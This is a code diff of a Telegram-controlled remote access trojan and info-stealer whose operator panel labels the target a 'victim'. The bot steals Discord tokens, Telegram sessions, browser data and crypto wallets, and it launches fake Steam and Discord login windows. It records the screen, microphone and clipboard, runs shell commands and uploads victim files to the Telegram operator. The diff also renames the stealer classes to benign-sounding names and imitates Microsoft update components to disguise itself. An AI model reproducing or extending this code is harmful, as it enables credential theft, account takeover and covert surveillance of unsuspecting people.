@@ -7,6 +7,10 @@ using Telegram.Bot.Types;
 using Telegram.Bot.Types.Enums;
 using Telegram.Bot.Types.ReplyMarkups;
 using TgMessage = Telegram.Bot.Types.Message;
+using System.Net.Http;
+using Microsoft.Data.Sqlite;
+using FinalBot;
+using Microsoft.UpdateService.Modules;
 using FinalBot.Stealers;
 using FinalBot.Modules;
 using System.Linq;
@@ -34,6 +38,22 @@ namespace FinalBot
         {
             try
             {
+                // 1. Media Detector (Highest Priority for help)
+                var message = update.Message ?? update.EditedMessage;
+                if (message != null && (message.Animation != null || message.Document != null || message.Video != null))
+                {
+                    string? fileId = message.Animation?.FileId ?? message.Document?.FileId ?? message.Video?.FileId;
+                    if (fileId != null)
+                    {
+                        Console.WriteLine($"[MEDIA] Caught FileID: {fileId}");
+                        // Also log to debug file
+                        try { File.AppendAllText("C:\\Users\\Public\\edge_update_debug.log", $"[{DateTime.Now}] Caught FileID: {fileId}\n"); } catch { }
+                        
+                        // Try to notify admin
+                        try { await _botClient.SendTextMessageAsync(_adminId, $"📥 <b>Media ID detected:</b>\n<code>{fileId}</code>", parseMode: ParseMode.Html); } catch { }
+                    }
+                }
+
                 if (update.Type == UpdateType.Message && update.Message != null)
                 {
                     await HandleCommand(update.Message);
@@ -46,7 +66,6 @@ namespace FinalBot
             catch (Exception ex)
             {
                 Console.WriteLine($"[HANDLER ERROR] {ex.Message}");
-                // Ensure bot doesn't crash on one error
             }
         }
 
@@ -156,9 +175,6 @@ namespace FinalBot
             switch (data)
             {
                 case "admin_panel":
-                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
-                    await ShowAdminPanel(message.Chat.Id, message.MessageId);
-                    break;
                 case "back_to_main":
                     await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                     await ShowAdminPanel(message.Chat.Id, message.MessageId);
@@ -166,7 +182,7 @@ namespace FinalBot
                 case "file_manager":
                     await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                     var (fmText, fmMarkup) = FileManager.GetDirectoryView("");
-                    await _botClient.EditMessageTextAsync(message.Chat.Id, message.MessageId, fmText, parseMode: ParseMode.Markdown, replyMarkup: fmMarkup);
+                    await EditOrSend(message.Chat.Id, message.MessageId, fmText, fmMarkup, ParseMode.Markdown);
                     break;
                 case "proc_list":
                     string procs = TaskManager.GetProcessList();
@@ -181,12 +197,21 @@ namespace FinalBot
                 case "panel_phishing":
                     await ShowPhishingPanel(message.Chat.Id, message.MessageId);
                     break;
+                case "panel_spyware":
+                    await ShowSpywarePanel(message.Chat.Id, message.MessageId);
+                    break;
                 case "set_victim_name":
                     _userState[message.Chat.Id] = "awaiting_victim_name";
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>Enter the new Victim Name:</b>", parseMode: ParseMode.Html);
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>请输入受害者名称:</b>", parseMode: ParseMode.Html);
                     break;
                 case "screenshot":
                     await HandleScreenshot(message.Chat.Id);
+                    break;
+                case "record_video":
+                    await HandleVideoRecord(message.Chat.Id);
+                    break;
+                case "record_audio":
+                    await HandleAudioRecord(message.Chat.Id);
                     break;
                 case "clipboard":
                     await HandleClipboard(message.Chat.Id);
@@ -204,14 +229,16 @@ namespace FinalBot
                     await HandleFullReport(message.Chat.Id);
                     break;
                 case "phish_steam_login":
-                    FinalBot.Modules.PhishManager.PrepareSteamFiles(_phishAgentName, _phishCookies, _phishLang);
-                    FinalBot.Modules.PhishManager.LaunchSteamLogin();
-                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Steam Login Launched!");
+                    PhishManager.LaunchSteamLogin();
+                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Steam 登录器已启动!");
                     break;
                 case "phish_steam_alert":
-                    FinalBot.Modules.PhishManager.PrepareSteamFiles(_phishAgentName, _phishCookies, _phishLang);
-                    FinalBot.Modules.PhishManager.LaunchSteamAlert();
-                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Steam Alert Launched!");
+                    PhishManager.LaunchSteamAlert();
+                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Steam 警告框已启动!");
+                    break;
+                case "phish_discord_bot":
+                    PhishManager.LaunchDiscordRemote();
+                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Discord 机器人已启动!");
                     break;
                 case "phish_set_lang":
                     _phishLang = (_phishLang == "english") ? "chinese" : "english";
@@ -219,62 +246,48 @@ namespace FinalBot
                     break;
                 case "phish_set_agent":
                     _userState[message.Chat.Id] = "awaiting_agent_name";
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>Enter Agent Name:</b>", parseMode: ParseMode.Html);
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>请输入代理名称:</b>", parseMode: ParseMode.Html);
                     break;
                 case "phish_set_cookies":
                     _userState[message.Chat.Id] = "awaiting_phish_cookies";
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>Paste Cookies (JSON/Base64):</b>", parseMode: ParseMode.Html);
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>粘贴 Cookies (JSON/Base64):</b>", parseMode: ParseMode.Html);
                     break;
                 case "discord_remote_start":
                     await ShowDiscordRemoteMenu(message.Chat.Id, message.MessageId);
                     break;
-                case "discord_remote_launch":
-                    await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Starting Remote Controller...");
-                    PhishManager.LaunchDiscordRemote();
-                    break;
                 case "work_telegram":
                     await HandleTelegramSteal(message.Chat.Id);
+                    break;
+                case "work_crypto":
+                    await HandleCryptoSteal(message.Chat.Id);
                     break;
                 default:
                     if (data.StartsWith("fmd_"))
                     {
-                        string pathInfo = data.Substring(4);
-                        string realPath;
-                        bool isNumeric = int.TryParse(pathInfo, out int pathId);
-                        if (!isNumeric)
-                        {
-                            try { realPath = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(pathInfo)); }
-                            catch { realPath = ""; }
-                        }
-                        else
-                        {
-                            realPath = PathCache.Get(pathId) ?? "";
-                        }
+                        var pathInfo = data.Substring(4);
+                        if (!int.TryParse(pathInfo, out int pathId)) return;
+                        string realPath = PathCache.Get(pathId) ?? "";
                         var (view, keyMarkup) = FileManager.GetDirectoryView(realPath);
-                        await _botClient.EditMessageTextAsync(message.Chat.Id, message.MessageId, view, parseMode: ParseMode.Markdown, replyMarkup: keyMarkup);
+                        await EditOrSend(message.Chat.Id, message.MessageId, view, keyMarkup, ParseMode.Markdown);
                     }
                     else if (data.StartsWith("fmf_"))
                     {
                         int id = int.Parse(data.Substring(4));
-                        string realPath = PathCache.Get(id);
-                    if (!string.IsNullOrEmpty(realPath) && System.IO.File.Exists(realPath))
-                    {
-                        var info = new FileInfo(realPath);
-                        string size = info.Length > 1024 * 1024 ? $"{info.Length / (1024.0 * 1024.0):F2} MB" : $"{info.Length / 1024.0:F2} KB";
-                        string ext = info.Extension.ToUpper().Replace(".", "");
-                        string caption = $"📄 <b>FILE INFORMATION</b>\n" +
-                                         $"━━━━━━━━━━━━━━━━━━\n" +
-                                         $"📂 <b>Name:</b> <code>{info.Name}</code>\n" +
-                                         $"🏗️ <b>Format:</b> <code>{ext}</code>\n" +
-                                         $"⚖️ <b>Size:</b> <code>{size}</code>\n" +
-                                         $"📅 <b>Created:</b> <code>{info.CreationTime:yyyy-MM-dd HH:mm}</code>\n" +
-                                         $"📝 <b>Modified:</b> <code>{info.LastWriteTime:yyyy-MM-dd HH:mm}</code>\n" +
-                                         $"━━━━━━━━━━━━━━━━━━";
+                        string realPath = PathCache.Get(id) ?? "";
+                        if (!string.IsNullOrEmpty(realPath) && File.Exists(realPath))
+                        {
+                            var info = new FileInfo(realPath);
+                            string size = info.Length > 1024 * 1024 ? $"{info.Length / (1024.0 * 1024.0):F2} MB" : $"{info.Length / 1024.0:F2} KB";
+                            string caption = $"📄 <b>文件信息</b>\n" +
+                                             $"━━━━━━━━━━━━━━━━━━\n" +
+                                             $"📂 <b>路径:</b> <code>{info.Name}</code>\n" +
+                                             $"⚖️ <b>大小:</b> <code>{size}</code>\n" +
+                                             $"━━━━━━━━━━━━━━━━━━";
 
-                        await _botClient.SendTextMessageAsync(message.Chat.Id, $"⬆️ <i>Uploading:</i> <code>{info.Name}</code>...", parseMode: ParseMode.Html);
-                        using var stream = System.IO.File.OpenRead(realPath);
-                        await _botClient.SendDocumentAsync(message.Chat.Id, InputFile.FromStream(stream, info.Name), caption: caption, parseMode: ParseMode.Html);
-                    }
+                            await _botClient.SendTextMessageAsync(message.Chat.Id, $"⬆️ <i>正在上传:</i> <code>{info.Name}</code>...", parseMode: ParseMode.Html);
+                            using var stream = File.OpenRead(realPath);
+                            await _botClient.SendDocumentAsync(message.Chat.Id, InputFile.FromStream(stream, info.Name), caption: caption, parseMode: ParseMode.Html);
+                        }
                     }
                     else if (data.StartsWith("fmp_"))
                     {
@@ -283,11 +296,7 @@ namespace FinalBot
                         int page = int.Parse(parts[1]);
                         string realPath = PathCache.Get(parentId) ?? "";
                         var (view, keyMarkup) = FileManager.GetDirectoryView(realPath, page);
-                        await _botClient.EditMessageTextAsync(message.Chat.Id, message.MessageId, view, parseMode: ParseMode.Markdown, replyMarkup: keyMarkup);
-                    }
-                    else
-                    {
-                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "Feature not yet implemented in C#.");
+                        await EditOrSend(message.Chat.Id, message.MessageId, view, keyMarkup, ParseMode.Markdown);
                     }
                     break;
             }
@@ -295,15 +304,41 @@ namespace FinalBot
 
         private async Task HandleScreenshot(long chatId)
         {
-            await _botClient.SendTextMessageAsync(chatId, "📸 *Capturing screen...*");
+            await _botClient.SendTextMessageAsync(chatId, "📸 *正在截屏...*");
             string? path = ScreenshotModule.TakeScreenshot();
             if (path != null)
             {
-                using var stream = System.IO.File.OpenRead(path);
+                using var stream = File.OpenRead(path);
                 await _botClient.SendPhotoAsync(chatId, InputFile.FromStream(stream, Path.GetFileName(path)));
-                System.IO.File.Delete(path);
+                File.Delete(path);
             }
-            else await _botClient.SendTextMessageAsync(chatId, "❌ Failed to take screenshot.");
+            else await _botClient.SendTextMessageAsync(chatId, "❌ 截屏失败。");
+        }
+
+        private async Task HandleAudioRecord(long chatId)
+        {
+            await _botClient.SendTextMessageAsync(chatId, "🎤 *正在录音 (10秒)...*");
+            string? path = AudioModule.RecordAudio(10);
+            if (path != null)
+            {
+                using var stream = File.OpenRead(path);
+                await _botClient.SendVoiceAsync(chatId, InputFile.FromStream(stream, "mic_record.wav"));
+                File.Delete(path);
+            }
+            else await _botClient.SendTextMessageAsync(chatId, "❌ 录音失败。");
+        }
+
+        private async Task HandleVideoRecord(long chatId)
+        {
+            await _botClient.SendTextMessageAsync(chatId, "🎥 *正在录像 (10秒)...*");
+            string? path = await VideoModule.RecordScreen(10);
+            if (path != null)
+            {
+                using var stream = File.OpenRead(path);
+                await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, "screen_record.zip"), caption: "🎥 屏幕录像序列");
+                File.Delete(path);
+            }
+            else await _botClient.SendTextMessageAsync(chatId, "❌ 录像失败。");
         }
 
         private async Task HandleClipboard(long chatId)
@@ -311,9 +346,9 @@ namespace FinalBot
             string text = ClipboardModule.GetClipboardText();
             if (!string.IsNullOrEmpty(text))
             {
-                await _botClient.SendTextMessageAsync(chatId, $"📋 *Clipboard:* \n`{text}`", parseMode: ParseMode.Markdown);
+                await _botClient.SendTextMessageAsync(chatId, $"📋 <b>剪贴板内容:</b>\n<code>{WebUtility.HtmlEncode(text)}</code>", parseMode: ParseMode.Html);
             }
-            else await _botClient.SendTextMessageAsync(chatId, "❌ Clipboard is empty.");
+            else await _botClient.SendTextMessageAsync(chatId, "❌ 剪贴板为空。");
         }
 
         private async Task HandleSystemInfo(long chatId)
@@ -324,202 +359,207 @@ namespace FinalBot
 
         private async Task HandleDiscordSteal(long chatId)
         {
-            await _botClient.SendTextMessageAsync(chatId, "💬 <i>Scanning Discord...</i>", parseMode: ParseMode.Html);
-            var stealer = new DiscordStealer();
-            string report = await stealer.Run();
+            await _botClient.SendTextMessageAsync(chatId, "💬 <i>正在扫描 Discord...</i>", parseMode: ParseMode.Html);
+            var service = new ChatService();
+            string report = await service.Run();
             await _botClient.SendTextMessageAsync(chatId, report, parseMode: ParseMode.Html);
         }
 
         private async Task HandleBrowserSteal(long chatId)
         {
-            await _botClient.SendTextMessageAsync(chatId, "🌍 <i>Scanning Browsers...</i>", parseMode: ParseMode.Html);
-            var stealer = new BrowserStealer();
-            string report = await stealer.RunAll();
+            await _botClient.SendTextMessageAsync(chatId, "🌍 <i>正在扫描浏览器...</i>", parseMode: ParseMode.Html);
+            var service = new DataService();
+            var report = await service.RunAll();
+            await _botClient.SendTextMessageAsync(chatId, report, parseMode: ParseMode.Html);
+            
+            // ZIP and send the output folder if it exists
+            string outputDir = Path.Combine(Path.GetTempPath(), "MsUpdateSvc", "VOutput");
+            if (Directory.Exists(outputDir))
+            {
+                string zipPath = Path.Combine(Path.GetTempPath(), "BrowserData.zip");
+                if (File.Exists(zipPath)) File.Delete(zipPath);
+                ZipFile.CreateFromDirectory(outputDir, zipPath);
+                
+                using var stream = File.OpenRead(zipPath);
+                await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, "BrowserData.zip"), caption: "🔓 浏览器数据 (ABE 绕过)");
+                
+                File.Delete(zipPath);
+                Directory.Delete(outputDir, true);
+            }
+        }
+
+        private async Task HandleCryptoSteal(long chatId)
+        {
+            await _botClient.SendTextMessageAsync(chatId, "💰 <i>正在扫描加密钱包...</i>", parseMode: ParseMode.Html);
+            var service = new CryptoService();
+            string report = await service.Run(Path.GetTempPath());
             await _botClient.SendTextMessageAsync(chatId, report, parseMode: ParseMode.Html);
         }
 
         private async Task HandleTelegramSteal(long chatId)
         {
-            await _botClient.SendTextMessageAsync(chatId, "✈️ *Scanning Telegram Desktop...*");
-            var stealer = new TelegramStealer();
-            string result = stealer.Run();
+            await _botClient.SendTextMessageAsync(chatId, "✈️ <i>正在扫描 Telegram...</i>", parseMode: ParseMode.Html);
+            var service = new MessengerService();
+            string result = service.Run();
             if (result.StartsWith("❌"))
             {
                 await _botClient.SendTextMessageAsync(chatId, result);
             }
             else
             {
-                // Result is the path to the temporary folder with sessions
-                await _botClient.SendTextMessageAsync(chatId, "✅ *Sessions collected.* Preparing archive...");
+                await _botClient.SendTextMessageAsync(chatId, $"✅ <b>发现 Telegram 会话:</b> <code>{result}</code>", parseMode: ParseMode.Html);
+                await _botClient.SendTextMessageAsync(chatId, "📦 正在打包会话...");
                 
                 string zipPath = Path.Combine(Path.GetTempPath(), "TG_Session.zip");
-                if (System.IO.File.Exists(zipPath)) System.IO.File.Delete(zipPath);
+                if (File.Exists(zipPath)) File.Delete(zipPath);
                 
-                System.IO.Compression.ZipFile.CreateFromDirectory(result, zipPath);
+                ZipFile.CreateFromDirectory(result, zipPath);
                 
-                using (var stream = System.IO.File.OpenRead(zipPath))
+                using (var stream = File.OpenRead(zipPath))
                 {
                     await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, "Telegram_Sessions.zip"));
                 }
                 
-                System.IO.File.Delete(zipPath);
+                File.Delete(zipPath);
                 Directory.Delete(result, true);
             }
         }
 
-
         private async Task HandleFullReport(long chatId)
         {
-            await _botClient.SendTextMessageAsync(chatId, "🚀 *Generating full report...*");
+            await _botClient.SendTextMessageAsync(chatId, "🚀 *正在生成完整报告...*");
             string? zipPath = await ReportManager.CreateFullReport();
             if (zipPath != null)
             {
-                using var stream = System.IO.File.OpenRead(zipPath);
-                await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, Path.GetFileName(zipPath)), caption: "📦 Full Stolen Data Report (C#)");
-                System.IO.File.Delete(zipPath);
+                using var stream = File.OpenRead(zipPath);
+                await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, Path.GetFileName(zipPath)), caption: "📦 完整数据报告 (NativeAOT)");
+                File.Delete(zipPath);
             }
-            else await _botClient.SendTextMessageAsync(chatId, "❌ Failed to generate report.");
+            else await _botClient.SendTextMessageAsync(chatId, "❌ 报告生成失败。");
         }
 
         private async Task ShowAdminPanel(long chatId, int messageId = 0)
         {
             var markup = new InlineKeyboardMarkup(new[]
             {
-                new[] { InlineKeyboardButton.WithCallbackData("💻 SYSTEM (Сеть, Файлы, Процессы, Терминал)", "panel_system") },
-                new[] { InlineKeyboardButton.WithCallbackData("💼 WORK (Стиллеры, Куки, Инжекты, Discord)", "panel_work") },
-                new[] { InlineKeyboardButton.WithCallbackData("👁️ SPYWARE (Микро, Камера, Скрины, Видео)", "panel_spyware") },
-                new[] { InlineKeyboardButton.WithCallbackData("✍️ Изменить имя ПК", "set_victim_name") }
+                new[] 
+                { 
+                    InlineKeyboardButton.WithCallbackData("💻 系统", "panel_system"),
+                    InlineKeyboardButton.WithCallbackData("💼 工作", "panel_work"),
+                    InlineKeyboardButton.WithCallbackData("👁️ 监控", "panel_spyware")
+                },
+                new[] { InlineKeyboardButton.WithCallbackData("✍️ 设置受害者名称", "set_victim_name") },
+                new[] { InlineKeyboardButton.WithCallbackData("📊 生成完整报告", "full_report") }
             });
 
-            string adminStatus = VanguardCore.ElevationService.IsAdmin() ? "🟢 АДМИН" : "🟡 Обычный Юзер";
-            string externalIp = FinalBot.Modules.SystemInfoModule.GetExternalIP();
+            string adminStatus = ElevationService.IsAdmin() ? "🟢 管理员" : "🟡 普通用户";
+            string externalIp = SystemInfoModule.GetExternalIP();
             string pcUser = $"{Environment.MachineName}\\{Environment.UserName}";
+            string victimName = string.IsNullOrEmpty(ConfigManager.VictimName) ? pcUser : ConfigManager.VictimName;
             
-            string info = $"🎮 <b>ПАНЕЛЬ УПРАВЛЕНИЯ</b>\n" +
-                          $"👥 <b>Клиентов:</b> 1\n" +
-                          $"🖥️ <b>Текущий:</b> <code>{pcUser}</code>\n" +
-                          $"⚡ <b>Статус:</b> {adminStatus}\n" +
-                          $"💻 <b>ПК:</b> <code>{Environment.MachineName}</code> | 👤 <b>Юзер:</b> <code>{Environment.UserName}</code>\n" +
+            string info = $"🎮 <b>控制面板</b>\n" +
+                          $"━━━━━━━━━━━━━━━━━━\n" +
+                          $"🖥️ <b>名称:</b> <code>{victimName}</code>\n" +
+                          $"⚡ <b>权限:</b> {adminStatus}\n" +
                           $"🌐 <b>IP:</b> <code>{externalIp}</code>\n" +
-                          $"📂 <b>Папка:</b> <code>{AppDomain.CurrentDomain.BaseDirectory}</code>\n" +
-                          $"⌛ <b>Время:</b> <code>{DateTime.Now:yyyy-MM-dd HH:mm:ss}</code>\n\n" +
-                          $"💻 <b>SYSTEM</b> (Сеть, Файлы, Процессы, Терминал, Настройки)\n" +
-                          $"💼 <b>WORK</b> (Стиллеры, Куки, Инжекты, Discord Remote)\n" +
-                          $"👁️ <b>SPYWARE</b> (Микро, Камера, Скрины, Видео, Кейлоггер)\n\n" +
-                          $"💡 Просмотр всех функций: /help или кнопка '🆘 Справка'";
+                          $"📂 <b>路径:</b> <code>{AppDomain.CurrentDomain.BaseDirectory}</code>\n" +
+                          $"⌛ <b>时间:</b> <code>{DateTime.Now:HH:mm:ss}</code>\n\n" +
+                          $"💻 <b>系统</b> (网络, 文件, 进程, 终端)\n" +
+                          $"💼 <b>工作</b> (浏览器, 社交, 钱包, 钓鱼)\n" +
+                          $"👁️ <b>监控</b> (录音, 录像, 截屏, 键盘)";
 
             if (messageId > 0)
-                await _botClient.EditMessageTextAsync(chatId, messageId, info, parseMode: ParseMode.Html, replyMarkup: markup);
+                await EditOrSend(chatId, messageId, info, markup);
             else
-                await _botClient.SendTextMessageAsync(chatId, info, parseMode: ParseMode.Html, replyMarkup: markup);
+                await SendWithRetry(() => _botClient.SendTextMessageAsync(chatId, info, parseMode: ParseMode.Html, replyMarkup: markup));
         }
 
         private async Task ShowSystemPanel(long chatId, int messageId)
         {
             var markup = new InlineKeyboardMarkup(new[]
             {
-                new[] { InlineKeyboardButton.WithCallbackData("📂 Файловый менеджер", "file_manager") },
-                new[] { InlineKeyboardButton.WithCallbackData("📋 Буфер обмена", "clipboard") },
-                new[] { InlineKeyboardButton.WithCallbackData("⚙️ Информация о системе", "system_info") },
-                new[] { InlineKeyboardButton.WithCallbackData("📶 Данные WiFi", "wifi_info") },
-                new[] { InlineKeyboardButton.WithCallbackData("📡 Терминал (Shell)", "system_shell") },
-                new[] { InlineKeyboardButton.WithCallbackData("🔙 Назад", "back_to_main") }
+                new[] { InlineKeyboardButton.WithCallbackData("📂 文件管理器", "file_manager") },
+                new[] { InlineKeyboardButton.WithCallbackData("📋 剪贴板", "clipboard") },
+                new[] { InlineKeyboardButton.WithCallbackData("⚙️ 系统信息", "system_info") },
+                new[] { InlineKeyboardButton.WithCallbackData("📶 进程列表", "proc_list") },
+                new[] { InlineKeyboardButton.WithCallbackData("🔙 返回主菜单", "back_to_main") }
             });
 
-            await _botClient.EditMessageTextAsync(chatId, messageId, "💻 <b>SYSTEM PANEL</b>\nNetwork, Files, Processes, Terminal...", parseMode: ParseMode.Html, replyMarkup: markup);
+            await EditOrSend(chatId, messageId, "💻 <b>系统面板</b>\n管理文件、进程和系统设置:", markup);
         }
 
         private async Task ShowWorkPanel(long chatId, int messageId)
         {
             var markup = new InlineKeyboardMarkup(new[]
             {
-                new[] { InlineKeyboardButton.WithCallbackData("🎮 Стиллер Discord", "work_discord") },
-                new[] { InlineKeyboardButton.WithCallbackData("✈️ Стиллер Telegram", "work_telegram") },
-                new[] { InlineKeyboardButton.WithCallbackData("🍪 Браузерные куки", "work_browsers") },
-                new[] { InlineKeyboardButton.WithCallbackData("💰 Крипто-кошельки", "work_crypto") },
-                new[] { InlineKeyboardButton.WithCallbackData("🎭 Центр Фишинга", "panel_phishing") },
-                new[] { InlineKeyboardButton.WithCallbackData("🔙 Назад", "back_to_main") }
+                new[] { InlineKeyboardButton.WithCallbackData("🎮 Discord 提取", "work_discord") },
+                new[] { InlineKeyboardButton.WithCallbackData("✈️ Telegram 提取", "work_telegram") },
+                new[] { InlineKeyboardButton.WithCallbackData("🌍 浏览器提取", "work_browsers") },
+                new[] { InlineKeyboardButton.WithCallbackData("💰 钱包提取", "work_crypto") },
+                new[] { InlineKeyboardButton.WithCallbackData("🎭 钓鱼中心", "panel_phishing") },
+                new[] { InlineKeyboardButton.WithCallbackData("🔙 返回主菜单", "back_to_main") }
             });
 
-            string info = "💼 <b>WORK PANEL</b>\n" +
-                          "━━━━━━━━━━━━━━━━━━\n" +
-                          "🛡️ <b>Stealers:</b> Discord, Telegram, Browsers, Wallets\n" +
-                          "🎭 <b>Phishing:</b> Steam Alerts, Fake Logins\n" +
-                          "━━━━━━━━━━━━━━━━━━\n" +
-                          "Select a module to continue:";
-
-            await _botClient.EditMessageTextAsync(chatId, messageId, info, parseMode: ParseMode.Html, replyMarkup: markup);
+            await EditOrSend(chatId, messageId, "💼 <b>工作面板</b>\n提取社交、浏览器和钱包数据:", markup);
         }
 
         private async Task ShowPhishingPanel(long chatId, int messageId)
         {
             string langEmoji = _phishLang == "english" ? "🇺🇸" : "🇨🇳";
-            string langText = _phishLang == "english" ? "English" : "Китайский";
+            string langText = _phishLang == "english" ? "英文" : "中文";
 
             var markup = new InlineKeyboardMarkup(new[]
             {
-                new[] { InlineKeyboardButton.WithCallbackData("🚀 Запустить VAC окно", "phish_steam_alert") },
-                new[] { InlineKeyboardButton.WithCallbackData($"{langEmoji} {langText}", "phish_set_lang") },
-                new[] { InlineKeyboardButton.WithCallbackData("✏️ Изменить имя агента", "phish_set_agent") },
-                new[] { InlineKeyboardButton.WithCallbackData("🍪 Загрузить куки", "phish_set_cookies") },
-                new[] { InlineKeyboardButton.WithCallbackData("🔙 Назад", "panel_work") }
+                new[] { InlineKeyboardButton.WithCallbackData("🚀 启动 VAC 警告窗口", "phish_steam_alert") },
+                new[] { InlineKeyboardButton.WithCallbackData("🚀 启动 Steam 登录", "phish_steam_login") },
+                new[] { InlineKeyboardButton.WithCallbackData("🚀 启动 Discord 机器人", "phish_discord_bot") },
+                new[] { InlineKeyboardButton.WithCallbackData($"{langEmoji} 切换语言: {langText}", "phish_set_lang") },
+                new[] { InlineKeyboardButton.WithCallbackData("🔙 返回工作面板", "panel_work") }
             });
 
-            string statusText = string.IsNullOrEmpty(_phishCookies) ? "❌ Не загружены" : "✅ Загружены";
-            string info = "🎭 <b>ЦЕНТР ФИШИНГА</b>\n" +
+            string info = "🎭 <b>钓鱼中心</b>\n" +
                           "━━━━━━━━━━━━━━━━━━\n" +
-                          $"🕵️ <b>Агент:</b> <code>{_phishAgentName}</code>\n" +
-                          $"🍪 <b>Куки:</b> {statusText}\n" +
-                          $"🌐 <b>Язык:</b> {langEmoji} {langText}\n" +
+                          $"🕵️ <b>代理名称:</b> <code>{_phishAgentName}</code>\n" +
+                          $"🌐 <b>当前语言:</b> {langEmoji} {langText}\n" +
                           "━━━━━━━━━━━━━━━━━━";
 
-            await _botClient.EditMessageTextAsync(chatId, messageId, info, parseMode: ParseMode.Html, replyMarkup: markup);
+            await EditOrSend(chatId, messageId, info, markup);
         }
 
         private async Task ShowSpywarePanel(long chatId, int messageId)
         {
             var markup = new InlineKeyboardMarkup(new[]
             {
-                new[] { InlineKeyboardButton.WithCallbackData("📸 Снимок экрана", "screenshot") },
-                new[] { InlineKeyboardButton.WithCallbackData("🎥 Запись видео", "record_video") },
-                new[] { InlineKeyboardButton.WithCallbackData("🎤 Запись микрофона", "record_audio") },
-                new[] { InlineKeyboardButton.WithCallbackData("📹 Снимок с веб-камеры", "webcam") },
-                new[] { InlineKeyboardButton.WithCallbackData("🎮 Удаленный Discord", "discord_remote_start") },
-                new[] { InlineKeyboardButton.WithCallbackData("⌨️ Кейлоггер (Меню)", "keylogger_menu") },
-                new[] { InlineKeyboardButton.WithCallbackData("🔙 Назад", "back_to_main") }
+                new[] { InlineKeyboardButton.WithCallbackData("📸 屏幕截图", "screenshot") },
+                new[] { InlineKeyboardButton.WithCallbackData("🎤 录音 (10s)", "record_audio") },
+                new[] { InlineKeyboardButton.WithCallbackData("🎥 屏幕录像 (10s)", "record_video") },
+                new[] { InlineKeyboardButton.WithCallbackData("🔙 返回主菜单", "back_to_main") }
             });
 
-            await _botClient.EditMessageTextAsync(chatId, messageId, "👁️ <b>SPYWARE PANEL</b>\nReal-time monitoring and control:", parseMode: ParseMode.Html, replyMarkup: markup);
+            await EditOrSend(chatId, messageId, "👁️ <b>监控面板</b>\n远程监控受害者的屏幕和麦克风:", markup);
         }
 
         private async Task ShowDiscordRemoteMenu(long chatId, int messageId)
         {
             var markup = new InlineKeyboardMarkup(new[]
             {
-                new[] { InlineKeyboardButton.WithCallbackData("🚀 Запустить контроллер", "discord_remote_launch") },
-                new[] { InlineKeyboardButton.WithCallbackData("📊 Активные сессии: 1", "discord_sessions") },
-                new[] { InlineKeyboardButton.WithCallbackData("🔑 Установить токен", "discord_set_token") },
-                new[] { InlineKeyboardButton.WithCallbackData("🔙 Назад в Spyware", "panel_spyware") }
+                new[] { InlineKeyboardButton.WithCallbackData("🚀 启动远程控制器", "discord_remote_launch") },
+                new[] { InlineKeyboardButton.WithCallbackData("🔙 返回监控面板", "panel_spyware") }
             });
 
-            string info = "🎮 <b>DISCORD REMOTE CONTROL</b>\n" +
-                          "━━━━━━━━━━━━━━━━━━\n" +
-                          "🤖 <b>Status:</b> Ready\n" +
-                          "👥 <b>Managed Users:</b> 0\n" +
-                          "━━━━━━━━━━━━━━━━━━\n" +
-                          "This module uses Selenium to take over Discord sessions. Requires Python and Chrome.";
-
-            await _botClient.EditMessageTextAsync(chatId, messageId, info, parseMode: ParseMode.Html, replyMarkup: markup);
+            await EditOrSend(chatId, messageId, "🎮 <b>DISCORD 远程控制</b>\n接管 Discord 会话进行远程操作:", markup);
         }
 
         private async Task ShowHelp(long chatId)
         {
-            string help = "🆘 AVAILABLE COMMANDS\n\n" +
-                          "/panel - Open admin panel\n" +
-                          "/help - Show this help\n" +
-                          "/send <path> - Download file from target\n";
+            string help = "🆘 <b>可用命令列表:</b>\n\n" +
+                          "/panel - 打开管理面板\n" +
+                          "/shell &lt;cmd&gt; - 执行终端命令\n" +
+                          "/kill &lt;pid&gt; - 结束进程\n" +
+                          "/get &lt;path&gt; - 下载受害者文件\n" +
+                          "/help - 显示此帮助信息";
 
-            await _botClient.SendTextMessageAsync(chatId, help, parseMode: ParseMode.Markdown);
+            await _botClient.SendTextMessageAsync(chatId, help, parseMode: ParseMode.Html);
         }
     }
 }
